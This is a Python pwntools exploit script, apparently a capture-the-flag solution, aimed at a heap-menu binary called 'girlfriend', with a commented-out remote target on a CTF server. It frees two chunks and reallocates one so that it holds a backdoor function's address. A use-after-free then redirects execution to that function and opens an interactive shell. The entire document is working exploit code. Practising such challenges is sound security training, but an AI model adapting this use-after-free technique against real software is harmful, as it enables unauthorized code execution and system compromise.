from pwn import *

io = process("./girlfriend")
# io = remote("node4.anna.nssctf.cn", 27992)

def add(size:int,content:bytes):
    io.recvuntil(b"choice :")
    io.sendline(b"1")
    io.recvuntil(b"is :")
    io.sendline(str(size).encode())
    io.recvuntil(b"is :")
    io.sendline(content)

def delete(index:int):
    io.recvuntil(b"choice :")
    io.sendline(b"2")
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def show(index:int):
    io.recvuntil(b"choice :")
    io.sendline(b"3")
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

backdoor = 0x400b9c
add(0x20, b"something")
add(0x20, b"thing")

delete(0)
delete(1)

add(0x10, p64(backdoor))

show(0)

io.interactive()
